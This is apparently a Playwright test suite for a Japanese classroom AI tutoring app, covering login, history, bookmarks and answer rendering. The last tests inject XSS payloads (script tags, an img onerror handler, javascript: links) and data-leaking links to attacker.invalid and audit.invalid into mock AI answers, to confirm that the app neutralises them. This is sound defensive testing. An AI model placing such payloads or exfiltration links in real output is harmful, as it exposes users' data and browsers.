import { expect, test, type Page } from "@playwright/test";
import { mockClassApi } from "./class-api";
import { retrieveVbaReferences } from "../../src/lib/vba-search";
import { appendVbaReferences } from "../../src/lib/vba-reference";
import { appendTextbookReferences } from "../../src/lib/textbooks";

async function navigate(page: Page, label: string) {
  const menu = page.getByRole("button", { name: "メニューを開く" });
  if (await menu.isVisible()) await menu.click();
  await page.getByRole("button", { name: new RegExp(`^${label}(?:\\s+\\d+)?$`) }).click();
}

async function login(page: Page, options?: Parameters<typeof mockClassApi>[1]) {
  await mockClassApi(page, options);
  await page.goto("/");
  await page.getByLabel("メールアドレス", { exact: true }).fill("class@example.com");
  await page.getByLabel("パスワード", { exact: true }).fill("test-password");
  await page.getByRole("button", { name: "ログイン", exact: true }).click();
  await expect(page.getByRole("textbox", { name: "質問を入力" })).toBeVisible();
}

test("course navigation starts fresh questions while keeping shared history accessible", async ({ page }) => {
  await login(page, { answerText: "登録された教材をもとにした解説です。" });
  const requests: { conversationId: string | null; message: string; courseId: string | null }[] = [];
  page.on("request", request => {
    if (new URL(request.url()).pathname === "/api/chat" && request.method() === "POST") requests.push(request.postDataJSON());
  });
  await navigate(page, "Webサイト制作実践科");
  await expect(page.getByRole("heading", { name: "Webサイト制作実践科", exact: true })).toBeVisible();
  await expect(page.locator(".mobile-overlay")).toHaveCount(0);
  await expect(page.getByRole("region", { name: "このコースの教科書" })).toContainText("PHP");
  await expect(page.getByRole("region", { name: "このコースの教科書" })).not.toContainText("Excel＿VBA");
  await page.getByRole("button", { name: "HTMLとCSSの役割の違いは？", exact: true }).click();
  await expect(page.getByRole("textbox", { name: "質問を入力" })).toHaveValue(/HTMLとCSSの役割/);
  expect(requests).toHaveLength(0);
  expect(await page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth)).toBe(true);
  await page.screenshot({ path: `test-results/courses-web-${test.info().project.name}.png`, animations: "disabled", scale: "css" });
  await page.getByRole("button", { name: "質問を送信" }).click();
  await expect(page.locator(".markdown")).toContainText("登録された教材");

  await navigate(page, "パソコン・AIスキルアップ科");
  await expect(page.getByRole("heading", { name: "パソコン・AIスキルアップ科", exact: true })).toBeVisible();
  await expect(page.locator(".markdown")).toHaveCount(0);
  await expect(page.getByRole("region", { name: "このコースの教科書" })).toContainText("Excel＿VBA");
  await expect(page.getByRole("region", { name: "このコースの教科書" })).not.toContainText("PHP");
  await expect(page.getByRole("textbox", { name: "質問を入力" })).toHaveValue("");
  await page.getByRole("button", { name: "ExcelのIF関数を使うには？", exact: true }).click();
  await expect(page.getByRole("textbox", { name: "質問を入力" })).toHaveValue(/ExcelのIF関数/);
  await page.screenshot({ path: `test-results/courses-pc-ai-${test.info().project.name}.png`, animations: "disabled", scale: "css" });
  await page.getByRole("button", { name: "質問を送信" }).click();
  await expect(page.locator(".markdown")).toContainText("登録された教材");
  expect(requests).toHaveLength(2);
  expect(requests.every(request => request.conversationId === null)).toBe(true);
  expect(requests.map(request => request.courseId)).toEqual(["website-production", "pc-ai-skills"]);

  await navigate(page, "質問を検索");
  await expect(page.locator(".history-card")).toHaveCount(2);
  await page.getByRole("button", { name: /HTMLとCSSの役割.*1回の質問/ }).click();
  await expect(page.locator(".markdown")).toContainText("登録された教材");
  await expect(page.locator(".topbar")).toContainText("Webサイト制作実践科");
  await page.reload();
  await expect(page.getByRole("textbox", { name: "質問を入力" })).toBeVisible();
  await navigate(page, "質問を検索");
  await page.getByRole("button", { name: /HTMLとCSSの役割.*1回の質問/ }).click();
  await expect(page.locator(".topbar")).toContainText("Webサイト制作実践科");
  await page.getByRole("textbox", { name: "質問を入力" }).fill("それを詳しく説明して");
  await page.getByRole("button", { name: "質問を送信" }).click();
  await expect(page.locator(".markdown")).toHaveCount(2);
  expect(requests[2].courseId).toBe("website-production");
  expect(requests[2].conversationId).toBeTruthy();
  await navigate(page, "新しい質問");
  await expect(page.getByRole("heading", { name: "何を知りたいですか？", exact: true })).toBeVisible();
});

test("a shared knowledge answer appears in chat and remains in saved history", async ({ page }) => {
  const answer = "サンプル先生の好きな食べ物は、カレーです。";
  await login(page, { answerText: answer });
  await page.getByRole("textbox", { name: "質問を入力" }).fill("サンプル先生の好きな食べ物は？");
  await page.getByRole("button", { name: "質問を送信" }).click();
  await expect(page.locator(".markdown")).toHaveText(answer);
  await expect(page.locator(".markdown")).not.toContainText("教科書");
  await page.screenshot({ path: `test-results/shared-knowledge-${test.info().project.name}.png` });
  await navigate(page, "質問を検索");
  await page.getByRole("button", { name: /サンプル先生の好きな食べ物は？.*1回の質問/ }).click();
  await expect(page.locator(".markdown")).toHaveText(answer);
});

test("a restored session waits for account verification but can ask before history arrives", async ({ page }) => {
  const previous = { id: "44444444-4444-4444-8444-444444444444", title: "以前の質問", subject: "すべて" as const, bookmarked: false, created_at: "2026-10-12T00:00:00Z", updated_at: "2026-10-12T00:00:00Z", messages: [] };
  await login(page, { initialConversations: [previous] });
  await expect(page.locator(".recent-item")).toHaveCount(1);
  let releaseAccount!: () => void;
  const accountWaiting = new Promise<void>(resolve => { releaseAccount = resolve; });
  let releaseHistory!: () => void;
  const historyWaiting = new Promise<void>(resolve => { releaseHistory = resolve; });
  let historyRequested = false;
  await page.route("**/api/account", async route => {
    await accountWaiting;
    await route.fulfill({ json: { displayName: "クラス共通" } });
  });
  await page.route("**/api/conversations", async route => {
    historyRequested = true;
    await historyWaiting;
    await route.fulfill({ json: { conversations: [previous] } });
  });
  try {
    await page.reload();
    await expect(page.getByText("学習スペースを準備しています…", { exact: true })).toBeVisible();
    await expect(page.getByRole("textbox", { name: "質問を入力" })).toHaveCount(0);
    expect(historyRequested).toBe(false);
    releaseAccount();
    await expect(page.getByRole("textbox", { name: "質問を入力" })).toBeVisible();
    await expect.poll(() => historyRequested).toBe(true);
    await navigate(page, "質問を検索");
    await expect(page.getByRole("heading", { name: "履歴を読み込んでいます…" })).toBeVisible();
    await expect(page.getByText("まだ質問はありません", { exact: true })).toHaveCount(0);
    if (await page.getByRole("button", { name: "メニューを開く" }).isVisible()) {
      await expect.poll(() => page.locator(".sidebar").evaluate(element => element.getBoundingClientRect().right)).toBeLessThanOrEqual(0);
    }
    await page.screenshot({ path: `test-results/background-history-${test.info().project.name}.png` });
    await navigate(page, "新しい質問");
    await page.getByRole("textbox", { name: "質問を入力" }).fill("履歴の読み込み中の質問");
    await page.getByRole("button", { name: "質問を送信" }).click();
    await expect(page.locator(".markdown")).toContainText("セルに文字を入力");
    releaseHistory();
    await expect(page.locator(".recent-item")).toHaveCount(2);
    await expect(page.locator(".markdown")).toContainText("セルに文字を入力");
    await navigate(page, "質問を検索");
    await expect(page.locator(".history-card")).toHaveCount(2);
    await page.getByRole("button", { name: /履歴の読み込み中の質問.*1回の質問/ }).click();
    await expect(page.locator(".markdown")).toContainText("セルに文字を入力");
  } finally { releaseAccount(); releaseHistory(); }
});

test("a rejected restored account cannot open the learning space or fetch history", async ({ page }) => {
  await login(page);
  await expect(page.locator(".recent-empty")).toContainText("ここに質問が並びます");
  const historyRequests: string[] = [];
  page.on("request", request => { if (request.url().includes("/api/conversations")) historyRequests.push(request.url()); });
  await page.route("**/api/account", route => route.fulfill({ status: 403, json: { error: "このクラスの共通アカウントでログインしてください。" } }));
  await page.reload();
  await expect(page.getByRole("heading", { name: "クラスにログイン" })).toBeVisible();
  await expect(page.locator(".alert.error")).toContainText("このクラスの共通アカウントでログインしてください");
  await expect(page.getByRole("textbox", { name: "質問を入力" })).toHaveCount(0);
  expect(historyRequests).toEqual([]);
});

test("stalled history times out and offers a retry while the question editor remains usable", async ({ page }) => {
  await page.clock.install();
  await mockClassApi(page);
  let releaseHistory!: () => void;
  const waiting = new Promise<void>(resolve => { releaseHistory = resolve; });
  await page.route("**/api/conversations", async route => {
    await waiting;
    await route.fulfill({ json: { conversations: [] } });
  });
  try {
    await page.goto("/");
    await page.getByLabel("メールアドレス", { exact: true }).fill("class@example.com");
    await page.getByLabel("パスワード", { exact: true }).fill("test-password");
    await page.getByRole("button", { name: "ログイン", exact: true }).click();
    await expect(page.getByRole("textbox", { name: "質問を入力" })).toBeEnabled();
    await navigate(page, "質問を検索");
    await expect(page.getByRole("heading", { name: "履歴を読み込んでいます…" })).toBeVisible();
    await page.clock.fastForward(15001);
    await expect(page.locator(".alert.error")).toContainText("履歴を読み込めませんでした");
    await expect(page.getByRole("button", { name: "クラスの履歴を更新" })).toBeEnabled();
    await navigate(page, "新しい質問");
    await page.getByRole("textbox", { name: "質問を入力" }).fill("接続待ちが終わった後の質問");
    await expect(page.getByRole("button", { name: "質問を送信" })).toBeEnabled();
  } finally { releaseHistory(); }
});

test("failed background history can be retried without blocking questions", async ({ page }) => {
  await mockClassApi(page);
  await page.route("**/api/conversations", route => route.fulfill({ status: 503, json: { error: "履歴を取得できませんでした。" } }));
  await page.goto("/");
  await page.getByLabel("メールアドレス", { exact: true }).fill("class@example.com");
  await page.getByLabel("パスワード", { exact: true }).fill("test-password");
  await page.getByRole("button", { name: "ログイン", exact: true }).click();
  await expect(page.getByRole("textbox", { name: "質問を入力" })).toBeEnabled();
  await expect(page.locator(".alert.error")).toContainText("履歴を読み込めませんでした");
  await page.getByRole("textbox", { name: "質問を入力" }).fill("履歴の取得に失敗しても質問する");
  await page.getByRole("button", { name: "質問を送信" }).click();
  await expect(page.locator(".markdown")).toContainText("セルに文字を入力");
  await page.unroute("**/api/conversations");
  await navigate(page, "質問を検索");
  await page.getByRole("button", { name: "クラスの履歴を更新" }).click();
  await expect(page.getByRole("button", { name: "クラスの履歴を更新" })).toBeEnabled();
  await expect(page.locator(".history-card")).toHaveCount(1);
  await expect(page.locator(".alert.error")).toHaveCount(0);
});

test("logging out cancels background history before another login", async ({ page }) => {
  await login(page);
  await expect(page.locator(".recent-empty")).toContainText("ここに質問が並びます");
  let releaseHistory!: () => void;
  const waiting = new Promise<void>(resolve => { releaseHistory = resolve; });
  const requests: string[] = [];
  page.on("requestfailed", request => { if (request.url().includes("/api/conversations")) requests.push(request.url()); });
  await page.route("**/api/conversations", async route => {
    await waiting;
    await route.fulfill({ json: { conversations: [] } });
  });
  try {
    await page.reload();
    await expect(page.getByRole("textbox", { name: "質問を入力" })).toBeVisible();
    const menu = page.getByRole("button", { name: "メニューを開く" });
    if (await menu.isVisible()) await menu.click();
    await page.getByRole("button", { name: "クラス共通" }).click();
    await page.getByRole("button", { name: "この端末からログアウト" }).click();
    await expect(page.getByRole("heading", { name: "クラスにログイン" })).toBeVisible();
    await expect.poll(() => requests.length).toBeGreaterThan(0);
    releaseHistory();
    await page.unroute("**/api/conversations");
    await page.getByLabel("メールアドレス", { exact: true }).fill("class@example.com");
    await page.getByLabel("パスワード", { exact: true }).fill("test-password");
    await page.getByRole("button", { name: "ログイン", exact: true }).click();
    await expect(page.getByRole("textbox", { name: "質問を入力" })).toBeVisible();
    await expect(page.locator(".recent-empty")).toContainText("ここに質問が並びます");
    await expect(page.locator(".alert.error")).toHaveCount(0);
  } finally { releaseHistory(); }
});

test("a delayed history refresh cannot restore a question deleted while it was loading", async ({ page }) => {
  const previous = { id: "44444444-4444-4444-8444-444444444444", title: "更新中に削除する質問", subject: "すべて" as const, bookmarked: false, created_at: "2026-10-12T00:00:00Z", updated_at: "2026-10-12T00:00:00Z", messages: [] };
  await login(page, { initialConversations: [previous] });
  await navigate(page, "質問を検索");
  await expect(page.locator(".history-card")).toHaveCount(1);
  let releaseHistory!: () => void;
  const waiting = new Promise<void>(resolve => { releaseHistory = resolve; });
  await page.route("**/api/conversations", async route => {
    if (route.request().method() !== "GET") return route.fallback();
    await waiting;
    await route.fulfill({ json: { conversations: [previous] } });
  });
  try {
    await page.getByRole("button", { name: "クラスの履歴を更新" }).click();
    await expect(page.getByRole("button", { name: "更新しています…" })).toBeDisabled();
    await page.getByRole("button", { name: "この質問を削除" }).click();
    await page.getByRole("button", { name: "削除する", exact: true }).click();
    await expect(page.locator(".history-card")).toHaveCount(0);
    releaseHistory();
    await expect(page.getByRole("button", { name: "クラスの履歴を更新" })).toBeEnabled();
    await expect(page.locator(".history-card")).toHaveCount(0);
    await expect(page.getByRole("heading", { name: "まだ質問はありません" })).toBeVisible();
  } finally { releaseHistory(); }
});

test("a student can ask, save, find, reopen and delete a question", async ({ page }) => {
  const sharedBookmarkRequests: string[] = [];
  page.on("request", request => { if (request.method() === "PATCH") sharedBookmarkRequests.push(request.url()); });
  const errors: string[] = [];
  page.on("pageerror", error => errors.push(error.message));
  await login(page);
  await expect(page.getByRole("textbox", { name: "質問を入力" })).toBeVisible();
  await page.getByRole("button", { name: /セルA1に文字/ }).click();
  await expect(page.getByRole("textbox", { name: "質問を入力" })).toHaveValue("Excel VBAでセルA1に文字を入力する方法を教えて");
  await page.getByRole("button", { name: "質問を送信" }).click();
  await expect(page.locator(".markdown")).toContainText("セルに文字を入力");
  await expect(page.locator(".markdown pre code")).toContainText("Option Explicit");
  await page.getByRole("button", { name: "この質問を保存" }).click();
  await navigate(page, "保存した質問");
  await expect(page.locator(".history-card")).toHaveCount(1);
  await page.getByRole("textbox", { name: "質問を検索" }).fill("A1");
  await page.locator(".history-open").click();
  await expect(page.locator(".markdown")).toContainText("セルに文字を入力");
  await page.reload();
  await expect(page.getByRole("textbox", { name: "質問を入力" })).toBeVisible();
  await navigate(page, "保存した質問");
  await expect(page.locator(".history-card")).toHaveCount(1);
  await navigate(page, "質問を検索");
  await expect(page.locator(".history-card")).toHaveCount(1);
  await page.getByRole("button", { name: "この質問を削除" }).click();
  await expect(page.getByRole("dialog")).toBeVisible();
  await page.getByRole("button", { name: "削除する", exact: true }).click();
  await expect(page.locator(".history-card")).toHaveCount(0);
  expect(errors).toEqual([]);
  expect(sharedBookmarkRequests).toEqual([]);
});

test("bookmarks are independent between devices and survive reload and shared history refresh", async ({ page, browser }) => {
  const conversation = { id: "33333333-3333-4333-8333-333333333333", title: "端末別に保存する質問", subject: "すべて" as const, bookmarked: true, created_at: "2026-10-12T00:00:00Z", updated_at: "2026-10-12T00:00:00Z", messages: [] };
  const secondContext = await browser.newContext({ viewport: page.viewportSize()! });
  const second = await secondContext.newPage();
  async function signIn(target: Page) {
    await login(target, { initialConversations: [conversation] });
    await navigate(target, "保存した質問");
    await expect(target.locator(".history-card")).toHaveCount(1);
    await expect(target.getByRole("button", { name: "クラスの履歴を更新" })).toHaveCount(0);
    await expect(target.getByRole("button", { name: "この質問を削除" })).toHaveCount(0);
  }
  try {
    await signIn(page); await signIn(second);
    await page.getByRole("button", { name: "保存を解除", exact: true }).click();
    await expect(page.locator(".history-card")).toHaveCount(0);
    await navigate(page, "質問を検索");
    await page.getByRole("button", { name: "クラスの履歴を更新" }).click();
    await navigate(page, "保存した質問");
    await expect(page.locator(".history-card")).toHaveCount(0);
    await page.reload(); await expect(page.getByRole("textbox", { name: "質問を入力" })).toBeVisible();
    await navigate(page, "保存した質問"); await expect(page.locator(".history-card")).toHaveCount(0);
    await second.reload(); await expect(second.getByRole("textbox", { name: "質問を入力" })).toBeVisible();
    await navigate(second, "保存した質問"); await expect(second.locator(".history-card")).toHaveCount(1);
    if (await second.getByRole("button", { name: "メニューを開く" }).isVisible()) {
      await expect.poll(() => second.locator(".sidebar").evaluate(element => element.getBoundingClientRect().right)).toBeLessThanOrEqual(0);
    }
    await second.screenshot({ path: `test-results/device-bookmarks-${test.info().project.name}.png` });
  } finally { await secondContext.close(); }
});

test("long answers open at their beginning and offer a deliberate jump to the end", async ({ page }) => {
  await login(page, { answerSuffix: "\n\n" + Array.from({ length: 18 }, (_, index) => `## 手順${index + 1}\n\n対象のシートとセルを確認します。変数の宣言と値の設定を順番に試してください。`).join("\n\n") });
  const input = page.getByRole("textbox", { name: "質問を入力" });
  await input.fill("VBAを長い手順で説明してください");
  await page.getByRole("button", { name: "質問を送信" }).click();
  const answer = page.locator(".latest-answer");
  const startOffset = () => answer.evaluate(element => element.getBoundingClientRect().top - document.querySelector(".chat-scroll")!.getBoundingClientRect().top);
  await expect.poll(startOffset).toBeGreaterThanOrEqual(20);
  await expect.poll(startOffset).toBeLessThanOrEqual(28);
  await expect(answer.getByRole("heading", { name: "セルに文字を入力" })).toBeInViewport();
  await expect(answer.getByRole("heading", { name: "手順18", exact: true })).not.toBeInViewport();
  await page.screenshot({ path: `test-results/answer-start-${test.info().project.name}.png` });
  await page.getByRole("button", { name: "回答の末尾へ", exact: true }).click();
  await expect(answer.getByRole("heading", { name: "手順18", exact: true })).toBeInViewport();
  await expect(answer.getByRole("button", { name: "コピー", exact: true })).toBeInViewport();
  await input.fill("もう一度説明してください");
  await page.getByRole("button", { name: "質問を送信" }).click();
  await expect(page.locator(".markdown")).toHaveCount(2);
  await expect.poll(startOffset).toBeGreaterThanOrEqual(20);
  await expect.poll(startOffset).toBeLessThanOrEqual(28);
  await navigate(page, "質問を検索");
  await page.locator(".history-open").click();
  await expect.poll(startOffset).toBeGreaterThanOrEqual(20);
  await expect.poll(startOffset).toBeLessThanOrEqual(28);
});

test("even short follow-up answers start at the top of the reading area", async ({ page }) => {
  await login(page);
  for (const question of ["VBAを教えて", "短く説明して"]) {
    await page.getByRole("textbox", { name: "質問を入力" }).fill(question);
    await page.getByRole("button", { name: "質問を送信" }).click();
    await expect(page.locator(".thinking")).toHaveCount(0);
    await expect.poll(() => page.locator(".latest-answer").evaluate(element => element.getBoundingClientRect().top - document.querySelector(".chat-scroll")!.getBoundingClientRect().top)).toBeGreaterThanOrEqual(20);
    await expect.poll(() => page.locator(".latest-answer").evaluate(element => element.getBoundingClientRect().top - document.querySelector(".chat-scroll")!.getBoundingClientRect().top)).toBeLessThanOrEqual(28);
    await expect(page.locator(".latest-answer pre code")).toBeInViewport();
    await expect(page.getByRole("button", { name: "回答の末尾へ" })).toHaveCount(0);
  }
  await page.screenshot({ path: `test-results/answer-short-${test.info().project.name}.png` });
});

test("receiving an answer does not pull a reader away from an earlier answer", async ({ page }) => {
  await login(page, { answerSuffix: "\n\n" + "以前の説明を読み返しています。\n\n".repeat(50) });
  const input = page.getByRole("textbox", { name: "質問を入力" });
  await input.fill("最初の質問");
  await page.getByRole("button", { name: "質問を送信" }).click();
  await expect(page.locator(".markdown")).toHaveCount(1);
  let releaseAnswer!: () => void;
  const waiting = new Promise<void>(resolve => { releaseAnswer = resolve; });
  await page.route("**/api/chat", async route => {
    await waiting;
    await route.fulfill({ json: { answer: "### 新しい回答\n\n新しい質問への説明です。", conversationId: route.request().postDataJSON().conversationId, saved: true } });
  });
  await input.fill("次の質問");
  await page.getByRole("button", { name: "質問を送信" }).click();
  await expect(page.locator(".thinking")).toBeVisible();
  await page.locator(".chat-scroll").evaluate(element => { element.scrollTop = 0; });
  await expect(page.locator(".markdown").first().getByRole("heading", { name: "セルに文字を入力" })).toBeInViewport();
  releaseAnswer();
  await expect(page.locator(".markdown")).toHaveCount(2);
  await expect.poll(() => page.locator(".chat-scroll").evaluate(element => element.scrollTop)).toBe(0);
  await page.getByRole("button", { name: "最新の回答の先頭へ" }).click();
  await expect(page.locator(".latest-answer").getByRole("heading", { name: "新しい回答" })).toBeInViewport();
});

test("hint mode, preferences and Japanese composition behave correctly", async ({ page }) => {
  await page.addInitScript(() => {
    if (!localStorage.getItem("yui.preferences.v1")) localStorage.setItem("yui.preferences.v1", JSON.stringify({ level: "実務に応用", mode: "explain" }));
  });
  await login(page);
  await expect(page.getByRole("textbox", { name: "質問を入力" })).toBeVisible();
  const menu = page.getByRole("button", { name: "メニューを開く" });
  if (await menu.isVisible()) await menu.click();
  await page.locator(".profile").click();
  await expect(page.getByRole("heading", { name: "回答のスタイル", exact: true })).toBeVisible();
  await expect(page.getByRole("combobox", { name: "学習経験", exact: true })).toHaveCount(0);
  await page.getByRole("button", { name: /まずはヒント/ }).click();
  await page.getByRole("button", { name: "設定を完了" }).click();
  const close = page.getByRole("button", { name: "メニューを閉じる" }).last();
  if (await close.isVisible()) await close.click();
  await page.getByRole("button", { name: /セルA1に文字/ }).click();
  const input = page.getByRole("textbox", { name: "質問を入力" });
  await input.dispatchEvent("keydown", { key: "Enter", code: "Enter", isComposing: true });
  await expect(page.locator(".markdown")).toHaveCount(0);
  const submitted = page.waitForRequest(request => new URL(request.url()).pathname === "/api/chat" && request.method() === "POST");
  await input.press("Enter");
  const payload = (await submitted).postDataJSON();
  expect(payload.mode).toBe("hint");
  expect(payload).not.toHaveProperty("level");
  await expect(page.locator(".markdown")).toContainText("まずはヒント");
  await expect(page.locator(".markdown")).not.toContainText("セルに文字を入力");
  await page.reload();
  await expect(page.getByRole("textbox", { name: "質問を入力" })).toBeVisible();
  const open = page.getByRole("button", { name: "メニューを開く" });
  if (await open.isVisible()) await open.click();
  await expect(page.locator(".profile")).toContainText("まずはヒント");
  expect(await page.evaluate(() => JSON.parse(localStorage.getItem("yui.preferences.v1")!))).toEqual({ mode: "hint" });
  await page.locator(".profile").click();
  await expect(page.getByRole("combobox")).toHaveCount(0);
  await expect(page.getByRole("dialog")).not.toContainText("学習経験");
  await page.screenshot({ path: `test-results/answer-style-settings-${test.info().project.name}.png` });
});

test("layout stays inside the viewport and dialogs support keyboard dismissal", async ({ page }) => {
  await login(page);
  await expect(page.getByRole("textbox", { name: "質問を入力" })).toBeVisible();
  expect(await page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth)).toBe(true);
  expect(await page.locator(".chat-scroll").evaluate(element => element.scrollTop)).toBe(0);
  await page.locator(".question-tip").click();
  await expect(page.getByRole("dialog")).toBeVisible();
  await page.keyboard.press("Escape");
  await expect(page.getByRole("dialog")).not.toBeVisible();
  await page.screenshot({ path: `test-results/welcome-${test.info().project.name}.png`, fullPage: true });
});

test("unconfigured access cannot bypass login using old local history", async ({ page }) => {
  await mockClassApi(page, { configured: false });
  await page.addInitScript(() => localStorage.setItem("yui.demo.conversations.v1", JSON.stringify([{ id: "old-history", title: "昔の体験履歴", messages: [] }])));
  await page.goto("/");
  await expect(page.getByRole("heading", { name: "クラスにログイン" })).toBeVisible();
  await expect(page.getByRole("button", { name: "体験モードを開く", exact: true })).toHaveCount(0);
  await expect(page.getByRole("button", { name: "新しい質問", exact: true })).toHaveCount(0);
  await expect(page.getByText("昔の体験履歴")).toHaveCount(0);
  await page.getByLabel("メールアドレス", { exact: true }).fill("class@example.com");
  await page.getByLabel("パスワード", { exact: true }).fill("test-password");
  await expect(page.getByRole("button", { name: "ログイン", exact: true })).toBeDisabled();
  await page.getByRole("button", { name: "パスワードを表示", exact: true }).click();
  await expect(page.getByLabel("パスワード", { exact: true })).toHaveAttribute("type", "text");
  await expect(page.getByText("共通アカウントの接続設定がまだ完了していません。設定完了後にログインできます。", { exact: true })).toBeVisible();
});

test("a failed AI request shows an error and restores the question", async ({ page }) => {
  await login(page);
  await page.route("**/api/chat", route => route.fulfill({ status: 502, json: { error: "AIが回答できませんでした。もう一度お試しください。" } }));
  await page.getByRole("button", { name: /セルA1に文字/ }).click();
  await page.getByRole("button", { name: "質問を送信" }).click();
  await expect(page.getByRole("alert").filter({ hasText: "AIが回答できませんでした" })).toBeVisible();
  await expect(page.locator(".markdown")).toHaveCount(0);
  await expect(page.getByRole("textbox", { name: "質問を入力" })).toHaveValue("Excel VBAでセルA1に文字を入力する方法を教えて");
});

test("an incorrect class password does not open the learning space", async ({ page }) => {
  await mockClassApi(page);
  await page.goto("/");
  await page.getByLabel("メールアドレス", { exact: true }).fill("class@example.com");
  await page.getByLabel("パスワード", { exact: true }).fill("wrong-test-password");
  await page.getByRole("button", { name: "ログイン", exact: true }).click();
  await expect(page.getByRole("alert").filter({ hasText: "ログインできませんでした" })).toBeVisible();
  await expect(page.getByRole("textbox", { name: "質問を入力" })).toHaveCount(0);
});

test("only cited textbook pages appear once in answers and reopened history", async ({ page }) => {
  const answer = appendTextbookReferences("\n\nセルはRangeで指定します。［教材1］値はValueで設定します。［教材3］", {
    status: "matched",
    chunks: [20, 21, 20, 22, 23, 24].map((pageNumber, index) => ({ id: `44444444-4444-4444-8444-${String(index).padStart(12, "0")}`, filename: "Excel＿VBA.pdf", page: pageNumber, content: "セルはRangeで指定し、Valueで値を設定します。", extraction_method: "text", source_format: "pdf", similarity: 0.8 })),
  });
  await login(page, { answerSuffix: answer });
  await page.getByRole("textbox", { name: "質問を入力" }).fill("教科書のセル入力を説明して");
  await page.getByRole("button", { name: "質問を送信" }).click();
  const references = page.locator(".markdown ul li");
  await expect(page.locator(".markdown").getByRole("heading", { name: "参照した教科書", exact: true })).toBeVisible();
  await expect(references).toHaveCount(1);
  await expect(references).toHaveText("教材1・教材3：Excel＿VBA.pdf — PDF p.20");
  await page.reload();
  await expect(page.getByRole("textbox", { name: "質問を入力" })).toBeVisible();
  await navigate(page, "質問を検索");
  await expect(page.locator(".history-card")).toHaveCount(1);
  await page.locator(".history-open").click();
  await expect(references).toHaveCount(1);
  await expect(references).toHaveText("教材1・教材3：Excel＿VBA.pdf — PDF p.20");
});

test("saved official reference excerpts retain their citations in answers and reopened history", async ({ page }) => {
  // Search the shipped corpus; only authentication and the generated answer are fixtures.
  const references = await retrieveVbaReferences("すべて", "Excel VBAでセルA1に文字を入力する方法を教えて");
  expect(references.status).toBe("matched");
  await mockClassApi(page, { answerSuffix: appendVbaReferences("", references) });
  await page.goto("/");
  await page.getByLabel("メールアドレス", { exact: true }).fill("class@example.com");
  await page.getByLabel("パスワード", { exact: true }).fill("test-password");
  await page.getByRole("button", { name: "ログイン", exact: true }).click();
  await page.getByRole("button", { name: /セルA1に文字/ }).click();
  await page.getByRole("button", { name: "質問を送信" }).click();
  await expect(page.locator(".markdown")).toContainText("参照した公式資料");
  await expect(page.locator(".markdown")).toContainText("2026-10-09");
  const source = page.locator('.markdown a[href="https://learn.microsoft.com/ja-jp/office/vba/api/excel.range.value"]').first();
  await expect(source).toBeVisible();
  await expect(source).toHaveAttribute("target", "_blank");
  await navigate(page, "質問を検索");
  await page.locator(".history-open").click();
  await expect(source).toBeVisible();
  await page.locator(".markdown p").last().scrollIntoViewIfNeeded();
  await page.screenshot({ path: `test-results/vba-reference-${test.info().project.name}.png`, fullPage: true });
});

test("untrusted answer images and HTML cannot issue external requests or execute scripts", async ({ page }) => {
  const imageRequests: string[] = [];
  await page.route("https://audit.invalid/**", route => {
    imageRequests.push(route.request().url());
    return route.abort();
  });
  await mockClassApi(page, { answerSuffix: '\n\n![図の説明](https://audit.invalid/pixel?question=SYNTHETIC_ONLY)\n\n<img src="https://audit.invalid/raw" onerror="window.__auditXss=true">\n\n<script>window.__auditXss=true</script>\n\n[unsafe](javascript:alert(1))' });
  await page.goto("/");
  await page.getByLabel("メールアドレス", { exact: true }).fill("class@example.com");
  await page.getByLabel("パスワード", { exact: true }).fill("test-password");
  await page.getByRole("button", { name: "ログイン", exact: true }).click();
  await page.getByRole("textbox", { name: "質問を入力" }).fill("SYNTHETIC_ONLY");
  await page.getByRole("button", { name: "質問を送信" }).click();
  await expect(page.locator(".markdown")).toContainText("図の説明");
  await expect(page.locator(".markdown img, .markdown script, .markdown a[href^='javascript:']")).toHaveCount(0);
  expect(await page.evaluate(() => Boolean((window as Window & { __auditXss?: boolean }).__auditXss))).toBe(false);
  const headers = (await page.request.get("/")).headers();
  expect(headers["content-security-policy"]).toContain("img-src 'self'");
  // Verify CSP also blocks an external image created independently of Markdown.
  const blocked = await page.evaluate(() => new Promise<boolean>(resolve => {
    const image = new Image();
    image.onerror = () => resolve(true);
    image.onload = () => resolve(false);
    image.src = "https://audit.invalid/csp";
  }));
  expect(blocked).toBe(true);
  expect(imageRequests).toEqual([]);
});

test("patched transitive KaTeX still renders inline and display math without trusted links", async ({ page }) => {
  await mockClassApi(page, { answerSuffix: '\n\n数式: $\\frac{1}{2}$ と $\\sqrt{4}$\n\n$$\nx^2 + y^2 = z^2\n$$\n\n$\\href{https://audit.invalid/math}{unsafe}$' });
  await page.goto("/");
  await page.getByLabel("メールアドレス", { exact: true }).fill("class@example.com");
  await page.getByLabel("パスワード", { exact: true }).fill("test-password");
  await page.getByRole("button", { name: "ログイン", exact: true }).click();
  await page.getByRole("textbox", { name: "質問を入力" }).fill("数式を説明して");
  await page.getByRole("button", { name: "質問を送信" }).click();
  await expect(page.locator(".markdown .katex")).toHaveCount(4);
  await expect(page.locator(".markdown .katex-display")).toHaveCount(1);
  await expect(page.locator(".markdown .mfrac")).toBeVisible();
  await expect(page.locator(".markdown .katex a, .markdown .katex img")).toHaveCount(0);
});


test("model-supplied external transmission links are inert while documentation links work", async ({ page }) => {
  await login(page, { answerSuffix: '\n\n[確認はこちら](https://attacker.invalid/collect?history=synthetic) [偽の公式](https://learn.microsoft.com.attacker.invalid/) [Microsoft Learn](https://learn.microsoft.com/ja-jp/office/vba/api/excel.range.value)' });
  await page.getByRole("textbox", { name: "質問を入力" }).fill("セル入力を説明して");
  await page.getByRole("button", { name: "質問を送信" }).click();
  await expect(page.locator(".markdown")).toContainText("確認はこちら");
  await expect(page.locator('.markdown a[href*="attacker.invalid"]')).toHaveCount(0);
  await expect(page.locator('.markdown a[href="https://learn.microsoft.com/ja-jp/office/vba/api/excel.range.value"]')).toBeVisible();
  await page.reload();
  await expect(page.getByRole("textbox", { name: "質問を入力" })).toBeVisible();
  await navigate(page, "質問を検索");
  await page.locator(".history-open").click();
  await expect(page.locator(".markdown")).toContainText("確認はこちら");
  await expect(page.locator('.markdown a[href*="attacker.invalid"]')).toHaveCount(0);
});
